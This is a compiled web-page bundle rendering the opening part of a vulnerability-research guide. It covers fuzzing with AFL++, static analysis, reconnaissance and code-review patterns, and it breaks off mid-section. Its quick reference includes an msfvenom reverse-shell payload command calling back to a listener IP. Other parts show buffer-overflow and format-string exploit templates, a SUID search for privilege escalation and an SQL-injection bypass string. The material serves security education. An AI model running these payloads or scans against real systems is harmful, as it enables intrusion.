"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[6159],{7581:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>t,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"Security/Pentesting/sop-vulnerability-research","title":"Vulnerability Research SOP","description":"Advanced vulnerability discovery: fuzzing, binary exploitation, memory corruption, CVE process & responsible disclosure. Tools: AFL++, Ghidra, GDB.","source":"@site/intel-codex/Security/Pentesting/sop-vulnerability-research.md","sourceDirName":"Security/Pentesting","slug":"/Security/Pentesting/sop-vulnerability-research","permalink":"/intel-codex/Security/Pentesting/sop-vulnerability-research","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/intel-codex/tree/main/intel-codex/Security/Pentesting/sop-vulnerability-research.md","tags":[],"version":"current","lastUpdatedAt":null,"frontMatter":{"type":"sop","title":"Vulnerability Research SOP","description":"Advanced vulnerability discovery: fuzzing, binary exploitation, memory corruption, CVE process & responsible disclosure. Tools: AFL++, Ghidra, GDB.","template_version":"2025-10-11T00:00:00.000Z"},"sidebar":"intelCodexSidebar","previous":{"title":"Mobile Security (iOS & Android)","permalink":"/intel-codex/Security/Pentesting/sop-mobile-security"},"next":{"title":"Web Application Security Testing SOP","permalink":"/intel-codex/Security/Pentesting/sop-web-application-security"}}');var r=i(74848),l=i(28453);const t={type:"sop",title:"Vulnerability Research SOP",description:"Advanced vulnerability discovery: fuzzing, binary exploitation, memory corruption, CVE process & responsible disclosure. Tools: AFL++, Ghidra, GDB.",template_version:new Date("2025-10-11T00:00:00.000Z")},a="Vulnerability Research SOP",c={},o=[{value:"Table of Contents",id:"table-of-contents",level:2},{value:"Overview",id:"overview",level:2},{value:"Quick Reference",id:"quick-reference",level:2},{value:"Vulnerability Categories",id:"vulnerability-categories",level:3},{value:"Critical Commands",id:"critical-commands",level:3},{value:"Common Exploit Patterns",id:"common-exploit-patterns",level:3},{value:"Research Methodology",id:"research-methodology",level:2},{value:"Vulnerability Discovery Process",id:"vulnerability-discovery-process",level:3},{value:"Reconnaissance &amp; Attack Surface Mapping",id:"reconnaissance--attack-surface-mapping",level:2},{value:"Network Service Enumeration",id:"network-service-enumeration",level:3},{value:"Application Fingerprinting",id:"application-fingerprinting",level:3},{value:"Binary Surface Analysis",id:"binary-surface-analysis",level:3},{value:"Static Analysis",id:"static-analysis",level:2},{value:"Source Code Analysis",id:"source-code-analysis",level:3},{value:"Automated Static Analysis",id:"automated-static-analysis",level:3},{value:"Dynamic Analysis &amp; Fuzzing",id:"dynamic-analysis--fuzzing",level:2},{value:"Fuzzing Fundamentals",id:"fuzzing-fundamentals",level:3},{value:"AFL++ (American Fuzzy Lop)",id:"afl-american-fuzzy-lop",level:3},{value:"LibFuzzer (LLVM)",id:"libfuzzer-llvm",level:3},{value:"Honggfuzz",id:"honggfuzz",level:3},{value:"Network Protocol Fuzzing",id:"network-protocol-fuzzing",level:3},{value:"Binary Exploitation",id:"binary-exploitation",level:2},{value:"Crash Analysis",id:"crash-analysis",level:3},{value:"Determining Exploitability",id:"determining-exploitability",level:3},{value:"Memory Corruption Vulnerabilities",id:"memory-corruption-vulnerabilities",level:2},{value:"Buffer Overflow",id:"buffer-overflow",level:3},{value:"Heap Exploitation",id:"heap-exploitation",level:3},{value:"Format String Vulnerability",id:"format-string-vulnerability",level:3},{value:"Integer Overflow",id:"integer-overflow",level:3},{value:"Logic Vulnerabilities",id:"logic-vulnerabilities",level:2},{value:"Authentication Bypass",id:"authentication-bypass",level:3},{value:"Business Logic Flaws",id:"business-logic-flaws",level:3},{value:"Insecure Deserialization",id:"insecure-deserialization",level:3},{value:"Race Conditions",id:"race-conditions",level:2},{value:"TOCTOU (Time-of-Check to Time-of-Use)",id:"toctou-time-of-check-to-time-of-use",level:3},{value:"Multi-threaded Race Conditions",id:"multi-threaded-race-conditions",level:3},{value:"Privilege Escalation",id:"privilege-escalation",level:2},{value:"Linux Privilege Escalation",id:"linux-privilege-escalation",level:3},{value:"Windows Privilege Escalation",id:"windows-privilege-escalation",level:3},{value:"Exploit Development",id:"exploit-development",level:2},{value:"Shellcode Development",id:"shellcode-development",level:3},{value:"ROP (Return-Oriented Programming)",id:"rop-return-oriented-programming",level:3},{value:"Heap Exploitation Techniques",id:"heap-exploitation-techniques",level:3},{value:"Exploit Mitigations &amp; Bypasses",id:"exploit-mitigations--bypasses",level:2},{value:"Stack Canaries",id:"stack-canaries",level:3},{value:"DEP/NX (Data Execution Prevention)",id:"depnx-data-execution-prevention",level:3},{value:"ASLR (Address Space Layout Randomization)",id:"aslr-address-space-layout-randomization",level:3},{value:"PIE (Position Independent Executable)",id:"pie-position-independent-executable",level:3},{value:"RELRO (Relocation Read-Only)",id:"relro-relocation-read-only",level:3},{value:"Control Flow Integrity (CFI)",id:"control-flow-integrity-cfi",level:3},{value:"CVE Process &amp; Disclosure",id:"cve-process--disclosure",level:2},{value:"CVE Request Process",id:"cve-request-process",level:3},{value:"Responsible Disclosure Timeline",id:"responsible-disclosure-timeline",level:3},{value:"Writing Security Advisories",id:"writing-security-advisories",level:3},{value:"Bug Bounty Programs",id:"bug-bounty-programs",level:2},{value:"Top Bug Bounty Platforms",id:"top-bug-bounty-platforms",level:3},{value:"Bug Bounty Best Practices",id:"bug-bounty-best-practices",level:3},{value:"Common Bounty Mistakes to Avoid",id:"common-bounty-mistakes-to-avoid",level:3},{value:"0-Day Research Ethics",id:"0-day-research-ethics",level:2},{value:"Responsible 0-Day Research",id:"responsible-0-day-research",level:3},{value:"0-Day Market Economics",id:"0-day-market-economics",level:3},{value:"Tools Reference",id:"tools-reference",level:2},{value:"Essential Tools",id:"essential-tools",level:3},{value:"Fuzzing Tools",id:"fuzzing-tools",level:3},{value:"Sanitizers (Debugging)",id:"sanitizers-debugging",level:3},{value:"Legal &amp; Ethical Considerations",id:"legal--ethical-considerations",level:2},{value:"Legal Framework",id:"legal-framework",level:3},{value:"Safe Harbor (Legal Protection)",id:"safe-harbor-legal-protection",level:3},{value:"Ethical Research Checklist",id:"ethical-research-checklist",level:3},{value:"Related SOPs",id:"related-sops",level:2},{value:"Appendix: Vulnerability Classification",id:"appendix-vulnerability-classification",level:2},{value:"CWE (Common Weakness Enumeration)",id:"cwe-common-weakness-enumeration",level:3},{value:"OWASP Top 10 Mapping",id:"owasp-top-10-mapping",level:3},{value:"Related SOPs",id:"related-sops-1",level:2}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",hr:"hr",input:"input",li:"li",mdxAdmonitionTitle:"mdxAdmonitionTitle",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)(n.admonition,{type:"danger",children:[(0,r.jsxs)(n.mdxAdmonitionTitle,{children:["Synced from an ",(0,r.jsx)(n.strong,{children:"Obsidian vault"})]}),(0,r.jsxs)(n.p,{children:["For graph and advanced features, download the ",(0,r.jsx)(n.strong,{children:"full"})," ",(0,r.jsx)(n.strong,{children:(0,r.jsx)(n.a,{href:"https://github.com/gl0bal01/intel-codex",children:"Intel Codex Vault"})})," and open it in ",(0,r.jsx)(n.strong,{children:"Obsidian"}),"."]})]}),"\n",(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"vulnerability-research-sop",children:"Vulnerability Research SOP"})}),"\n",(0,r.jsx)(n.h2,{id:"table-of-contents",children:"Table of Contents"}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#overview",children:"Overview"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#quick-reference",children:"Quick Reference"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#research-methodology",children:"Research Methodology"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#reconnaissance--attack-surface-mapping",children:"Reconnaissance & Attack Surface Mapping"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#static-analysis",children:"Static Analysis"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#dynamic-analysis--fuzzing",children:"Dynamic Analysis & Fuzzing"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#binary-exploitation",children:"Binary Exploitation"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#memory-corruption-vulnerabilities",children:"Memory Corruption Vulnerabilities"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#logic-vulnerabilities",children:"Logic Vulnerabilities"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#race-conditions",children:"Race Conditions"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#privilege-escalation",children:"Privilege Escalation"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#exploit-development",children:"Exploit Development"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#exploit-mitigations--bypasses",children:"Exploit Mitigations & Bypasses"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#cve-process--disclosure",children:"CVE Process & Disclosure"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#bug-bounty-programs",children:"Bug Bounty Programs"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#0-day-research-ethics",children:"0-Day Research Ethics"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#tools-reference",children:"Tools Reference"})}),"\n",(0,r.jsx)(n.li,{children:(0,r.jsx)(n.a,{href:"#legal--ethical-considerations",children:"Legal & Ethical Considerations"})}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"overview",children:"Overview"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"Purpose:"})," Comprehensive guide for discovering, analyzing, and responsibly disclosing security vulnerabilities in software and systems."]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Scope:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Vulnerability identification methodologies"}),"\n",(0,r.jsx)(n.li,{children:"Binary exploitation techniques"}),"\n",(0,r.jsx)(n.li,{children:"Fuzzing and dynamic analysis"}),"\n",(0,r.jsx)(n.li,{children:"Memory corruption and logic vulnerabilities"}),"\n",(0,r.jsx)(n.li,{children:"Exploit development"}),"\n",(0,r.jsx)(n.li,{children:"Responsible disclosure processes"}),"\n",(0,r.jsx)(n.li,{children:"CVE assignment and publication"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prerequisites:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Understanding of programming (C/C++, Python, Assembly)"}),"\n",(0,r.jsx)(n.li,{children:"Knowledge of operating system internals"}),"\n",(0,r.jsx)(n.li,{children:"Familiarity with debugging tools"}),"\n",(0,r.jsx)(n.li,{children:"Understanding of exploitation mitigations"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Related SOPs:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"Reverse-Engineering.md"})," - Binary analysis and disassembly"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"Web-Application-Security.md"})," - Web vulnerability research"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"Cryptography-Analysis.md"})," - Cryptographic vulnerability analysis"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.code,{children:"Firmware-Reverse-Engineering.md"})," - Embedded device vulnerabilities"]}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"quick-reference",children:"Quick Reference"}),"\n",(0,r.jsx)(n.h3,{id:"vulnerability-categories",children:"Vulnerability Categories"}),"\n",(0,r.jsxs)(n.table,{children:[(0,r.jsx)(n.thead,{children:(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.th,{children:"Category"}),(0,r.jsx)(n.th,{children:"Impact"}),(0,r.jsx)(n.th,{children:"Common Vectors"})]})}),(0,r.jsxs)(n.tbody,{children:[(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Memory Corruption"}),(0,r.jsx)(n.td,{children:"Critical"}),(0,r.jsx)(n.td,{children:"Buffer overflow, use-after-free, heap overflow"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Injection"}),(0,r.jsx)(n.td,{children:"Critical"}),(0,r.jsx)(n.td,{children:"SQL injection, command injection, XXE"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Authentication Bypass"}),(0,r.jsx)(n.td,{children:"Critical"}),(0,r.jsx)(n.td,{children:"Logic flaws, weak crypto, session issues"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Privilege Escalation"}),(0,r.jsx)(n.td,{children:"Critical"}),(0,r.jsx)(n.td,{children:"Kernel bugs, SUID binaries, misconfigurations"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Information Disclosure"}),(0,r.jsx)(n.td,{children:"Medium-High"}),(0,r.jsx)(n.td,{children:"Memory leaks, verbose errors, directory traversal"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Denial of Service"}),(0,r.jsx)(n.td,{children:"Medium"}),(0,r.jsx)(n.td,{children:"Resource exhaustion, null pointer dereference"})]}),(0,r.jsxs)(n.tr,{children:[(0,r.jsx)(n.td,{children:"Logic Flaws"}),(0,r.jsx)(n.td,{children:"Variable"}),(0,r.jsx)(n.td,{children:"Race conditions, business logic bypass"})]})]})]}),"\n",(0,r.jsx)(n.h3,{id:"critical-commands",children:"Critical Commands"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Fuzzing with AFL++\nafl-fuzz -i input_corpus/ -o findings/ -- ./target_binary @@\n\n# Debugging with GDB\ngdb -q ./target_binary\n> run $(python3 -c 'print(\"A\"*100)')\n\n# Find SUID binaries (privilege escalation)\nfind / -perm -4000 -type f 2>/dev/null\n\n# Binary security analysis\nchecksec --file=./binary\n\n# Kernel exploit compilation\ngcc -o exploit exploit.c -static -lpthread\n\n# Generate shellcode\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c\n"})}),"\n",(0,r.jsx)(n.h3,{id:"common-exploit-patterns",children:"Common Exploit Patterns"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-python",children:'# Buffer overflow exploit template\npayload = b"A" * offset              # Padding to EIP/RIP\npayload += p64(gadget_address)       # ROP gadget\npayload += p64(shellcode_address)    # Shellcode location\n\n# Format string exploit\npayload = b"%x " * 20                # Leak stack values\npayload = b"%7$s" + p64(address)     # Read arbitrary memory\n\n# Use-after-free exploit\n# 1. Allocate object\n# 2. Free object\n# 3. Allocate controlled data in same location\n# 4. Trigger use of freed object\n'})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"research-methodology",children:"Research Methodology"}),"\n",(0,r.jsx)(n.h3,{id:"vulnerability-discovery-process",children:"Vulnerability Discovery Process"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"1. Target Selection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Choose research target based on:\n# - Attack surface (network services, parsers, browsers)\n# - Complexity (more code = more bugs)\n# - Impact (kernel, authentication, crypto)\n# - Accessibility (open-source vs. closed-source)\n\n# Examples of high-value targets:\n# - Web browsers (Chrome, Firefox, Safari)\n# - Operating system kernels (Linux, Windows, macOS)\n# - Network services (SSH, HTTP servers, DNS)\n# - File parsers (PDF, image formats, office documents)\n# - Hypervisors (VMware, VirtualBox, Hyper-V)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"2. Information Gathering:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Collect information about target\n# - Version numbers\n# - Build configuration\n# - Dependencies\n# - Previous vulnerabilities (CVE database)\n# - Patch history\n\n# Check existing CVEs\nsearchsploit openssh 7.4\ncve search --product openssh --version 7.4\n\n# GitHub security advisories\nhttps://github.com/advisories?query=product:openssh\n\n# National Vulnerability Database\nhttps://nvd.nist.gov/\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"3. Attack Surface Analysis:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Identify entry points:\n# - Network ports and protocols\n# - File parsers\n# - User input handling\n# - IPC mechanisms\n# - API endpoints\n\n# Example: Web server attack surface\nnmap -sV -sC -p- target.com\n# - HTTP/HTTPS (80, 443)\n# - Admin panels\n# - File upload functionality\n# - API endpoints\n# - WebSocket connections\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"4. Code Review (if source available):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Search for dangerous functions\ngrep -r "strcpy\\|strcat\\|sprintf\\|gets" source_code/\ngrep -r "memcpy\\|strncpy\\|strncat" source_code/\ngrep -r "malloc\\|free\\|realloc" source_code/\n\n# Look for common patterns\n# - Unbounded loops\n# - Integer overflows\n# - Missing input validation\n# - Race conditions (TOCTOU)\n# - Improper error handling\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"5. Binary Analysis (if closed-source):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Reverse engineer binary (see Reverse-Engineering.md)\n# - Disassembly with IDA Pro, Ghidra, Binary Ninja\n# - Identify vulnerabilities in assembly\n# - Reconstruct high-level logic\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"6. Fuzzing (automated testing):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Generate test cases to trigger crashes\n# - AFL++, LibFuzzer, Honggfuzz\n# - Coverage-guided fuzzing\n# - Mutation-based fuzzing\n# - Generation-based fuzzing (grammar)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"7. Vulnerability Confirmation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Reproduce crash reliably\n# Analyze crash (debugger, core dump)\n# Determine exploitability\n# Develop proof-of-concept exploit\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"8. Responsible Disclosure:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Report to vendor\n# Wait for patch development\n# Coordinate public disclosure\n# Request CVE assignment\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"reconnaissance--attack-surface-mapping",children:"Reconnaissance & Attack Surface Mapping"}),"\n",(0,r.jsx)(n.h3,{id:"network-service-enumeration",children:"Network Service Enumeration"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Full port scan\nnmap -p- --min-rate 10000 -T4 target.com -oN nmap_all_ports.txt\n\n# Service version detection\nnmap -sV -sC -p 21,22,80,443,3306,8080 target.com -oN nmap_services.txt\n\n# Vulnerability scanning\nnmap --script vuln -p 80,443 target.com\n\n# Banner grabbing\nnc -v target.com 80\nHEAD / HTTP/1.0\n\n# SSL/TLS version enumeration\nnmap --script ssl-enum-ciphers -p 443 target.com\n"})}),"\n",(0,r.jsx)(n.h3,{id:"application-fingerprinting",children:"Application Fingerprinting"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Web server fingerprinting\nwhatweb -v target.com\nwafw00f target.com  # WAF detection\n\n# CMS detection\nwpscan --url http://target.com  # WordPress\ndroopescan scan drupal -u http://target.com  # Drupal\n\n# Technology stack\ncurl -I http://target.com\n# Look for: Server, X-Powered-By, X-AspNet-Version headers\n\n# JavaScript frameworks\nretire --js --jspath http://target.com\n\n# Check robots.txt and sitemap\ncurl http://target.com/robots.txt\ncurl http://target.com/sitemap.xml\n"})}),"\n",(0,r.jsx)(n.h3,{id:"binary-surface-analysis",children:"Binary Surface Analysis"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# List imported functions (potential attack surface)\nobjdump -T ./binary | grep -E "strcpy|memcpy|system|exec"\n\n# Radare2 analysis\nr2 -A ./binary\n> afl  # List functions\n> ii   # List imports\n> iz   # List strings\n\n# Identify file parsers\nstrings ./binary | grep -i "png\\|jpg\\|pdf\\|xml"\n\n# Network-related functions\nstrings ./binary | grep -i "socket\\|connect\\|recv\\|send"\n'})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"static-analysis",children:"Static Analysis"}),"\n",(0,r.jsx)(n.h3,{id:"source-code-analysis",children:"Source Code Analysis"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Manual code review - dangerous patterns:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:"// \u274c Buffer overflow - unbounded copy\nchar buffer[64];\nstrcpy(buffer, user_input);  // No length check!\n\n// \u2705 Safe version\nstrncpy(buffer, user_input, sizeof(buffer) - 1);\nbuffer[sizeof(buffer) - 1] = '\\0';\n\n// \u274c Format string vulnerability\nprintf(user_input);  // User controls format string!\n\n// \u2705 Safe version\nprintf(\"%s\", user_input);\n\n// \u274c Integer overflow\nint size = user_size;\nchar *buf = malloc(size);  // What if user_size is negative or huge?\nmemcpy(buf, data, size);\n\n// \u2705 Safe version\nif (user_size <= 0 || user_size > MAX_SIZE) {\n    return -1;\n}\nsize_t size = (size_t)user_size;\nchar *buf = malloc(size);\n\n// \u274c Use-after-free\nfree(ptr);\nptr->field = value;  // Use after free!\n\n// \u2705 Safe version\nfree(ptr);\nptr = NULL;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common vulnerability patterns:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-c",children:'// Integer overflow leading to buffer overflow\nvoid vulnerable(int count) {\n    char *buffer = malloc(count * sizeof(int));  // count * 4 can overflow!\n    if (!buffer) return;\n\n    for (int i = 0; i < count; i++) {\n        ((int*)buffer)[i] = get_data();  // Heap overflow if count * 4 wrapped\n    }\n}\n\n// Time-of-check to time-of-use (TOCTOU)\nif (access("/tmp/file", W_OK) == 0) {  // Check\n    // Attacker can replace /tmp/file with symlink here!\n    FILE *f = fopen("/tmp/file", "w");  // Use\n}\n\n// Race condition\nif (global_counter < MAX) {  // Thread 1 checks\n    // Thread 2 can increment here\n    global_counter++;  // Thread 1 increments (can exceed MAX)\n}\n\n// SQL injection (interpreted language)\nquery = "SELECT * FROM users WHERE username=\'" + user_input + "\'"\n# user_input = "admin\' OR \'1\'=\'1" \u2192 authentication bypass\n'})}),"\n",(0,r.jsx)(n.h3,{id:"automated-static-analysis",children:"Automated Static Analysis"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Cppcheck (C/C++):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install\nsudo apt install cppcheck\n\n# Basic scan\ncppcheck --enable=all --inconclusive source_code/\n\n# Specific checks\ncppcheck --enable=warning,performance,portability source_code/\n\n# XML output for further analysis\ncppcheck --xml --xml-version=2 source_code/ 2> report.xml\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Semgrep (multi-language):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install\npip install semgrep\n\n# Scan with default rules\nsemgrep --config=auto source_code/\n\n# Security-focused scan\nsemgrep --config=p/security-audit source_code/\n\n# OWASP Top 10 rules\nsemgrep --config=p/owasp-top-ten source_code/\n\n# Custom rule example (detect dangerous strcpy)\ncat > strcpy_rule.yaml << 'EOF'\nrules:\n  - id: dangerous-strcpy\n    pattern: strcpy($DST, $SRC)\n    message: Unsafe strcpy detected - use strncpy instead\n    languages: [c, cpp]\n    severity: WARNING\nEOF\n\nsemgrep --config=strcpy_rule.yaml source_code/\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Clang Static Analyzer:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Analyze during build\nscan-build make\n\n# Specific file\nclang --analyze vulnerable.c\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"FlawFinder (C/C++):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Install\nsudo apt install flawfinder\n\n# Scan source code\nflawfinder source_code/\n\n# Minimum risk level\nflawfinder --minlevel=4 source_code/\n\n# HTML report\nflawfinder --html source_code/ > report.html\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"dynamic-analysis--fuzzing",children:"Dynamic Analysis & Fuzzing"}),"\n",(0,r.jsx)(n.h3,{id:"fuzzing-fundamentals",children:"Fuzzing Fundamentals"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Types of fuzzing:"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Mutation-based"})," - Mutate existing valid inputs"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Generation-based"})," - Generate inputs from grammar/specification"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Coverage-guided"})," - Use code coverage feedback to guide input generation"]}),"\n",(0,r.jsxs)(n.li,{children:[(0,r.jsx)(n.strong,{children:"Symbolic execution"})," - Explore program paths systematically"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"afl-american-fuzzy-lop",children:"AFL++ (American Fuzzy Lop)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Installation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Linux\nsudo apt install afl++\n\n# Or build from source\ngit clone https://github.com/AFLplusplus/AFLplusplus.git\ncd AFLplusplus\nmake\nsudo make install\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Compile target for fuzzing:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Instrument binary with AFL++ compiler\nafl-gcc -o target_fuzz target.c\n\n# Or with additional sanitizers\nAFL_USE_ASAN=1 afl-gcc -o target_fuzz target.c  # AddressSanitizer\nAFL_USE_UBSAN=1 afl-gcc -o target_fuzz target.c  # UndefinedBehaviorSanitizer\nAFL_USE_MSAN=1 afl-clang -o target_fuzz target.c  # MemorySanitizer\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prepare input corpus:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Create directory with seed inputs\nmkdir input_corpus\necho "valid input 1" > input_corpus/input1.txt\necho "another valid input" > input_corpus/input2.txt\n\n# For binary formats, use valid files\ncp valid_image.png input_corpus/\ncp valid_pdf.pdf input_corpus/\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Run fuzzer:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Basic fuzzing\nafl-fuzz -i input_corpus/ -o findings/ -- ./target_fuzz @@\n\n# Explanation:\n# -i input_corpus/  : Input directory with seed files\n# -o findings/      : Output directory for crashes/hangs\n# @@                : Replaced with fuzzer-generated filename\n\n# Multiple fuzzers in parallel (recommended)\n# Master fuzzer\nafl-fuzz -i input_corpus/ -o findings/ -M fuzzer01 -- ./target_fuzz @@\n\n# Slave fuzzers (in separate terminals)\nafl-fuzz -i input_corpus/ -o findings/ -S fuzzer02 -- ./target_fuzz @@\nafl-fuzz -i input_corpus/ -o findings/ -S fuzzer03 -- ./target_fuzz @@\n\n# For stdin input (no @@)\nafl-fuzz -i input_corpus/ -o findings/ -- ./target_fuzz\n\n# With custom dictionary\nafl-fuzz -i input_corpus/ -o findings/ -x dictionary.txt -- ./target_fuzz @@\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Dictionary example (for format-aware fuzzing):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# dictionary.txt - PDF 